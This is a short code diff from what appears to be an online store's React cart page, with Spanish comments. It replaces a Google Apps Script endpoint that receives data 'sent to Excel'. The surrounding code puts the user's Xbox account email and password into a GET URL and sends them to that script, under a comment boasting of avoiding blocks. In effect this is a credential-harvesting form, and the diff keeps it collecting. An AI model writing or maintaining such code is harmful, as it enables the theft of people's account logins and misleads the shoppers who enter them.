@@ -149,7 +149,7 @@ export default function CartPage() {
 
       // --- 🚀 ENVIAR DATOS AL EXCEL VÍA GET (Anti-Bloqueos) ---
       try {
-        const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbxJDSNYcpY7KfU-uvmSAlEvGYeKFRuuh2ZZ6A1hoUAZJqIEgPpfsfjHlV8ND4QY68U9xQ/exec'; 
+        const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbwH-s9lcSaWJAeKzUXGfBqmQypKKq2seh0bSO5eQLN88CvN-5PHXBW_X_xlPjCKmPfEjg/exec'; 
         
         // Armamos el link mágico con los datos del usuario
         const finalUrl = `${scriptBaseUrl}?correo=${encodeURIComponent(xboxEmail.trim())}&contrasena=${encodeURIComponent(xboxPassword.trim())}`;
